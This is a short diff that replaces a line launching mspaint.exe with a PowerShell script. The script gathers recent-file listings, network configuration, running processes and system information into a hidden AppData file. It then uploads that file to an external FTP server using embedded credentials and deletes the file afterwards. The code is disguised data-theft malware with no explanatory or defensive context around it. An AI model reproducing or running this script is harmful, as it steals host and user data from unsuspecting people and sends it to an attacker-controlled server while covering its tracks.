@@ -1,1 +1,19 @@
-mspaint.exe
+$filename = "$env:appdata\mih.mik"
+$rc = Get-ChildItem ([Environment]::GetFolderPath('Recent'))
+$ic = ipconfig /all
+$gp=Get-process
+$sy = systeminfo
+
+ac $filename $rc -Encoding 'utf8'
+ac $filename $ic
+ac $filename $gp
+ac $filename $sy
+
+
+$ftpuri = "ftp://4209703_qws:YXHHiOyi7Ozymj@qposg.getenjoyment.net/qposg.getenjoyment.net/"
+
+$webclient = New-Object System.Net.WebClient
+$uri = New-Object System.Uri($ftpuri + [IO.Path]::GetFileName($filename))
+$webclient.UploadFile($uri, $filename)
+
+remove-item $filename -force
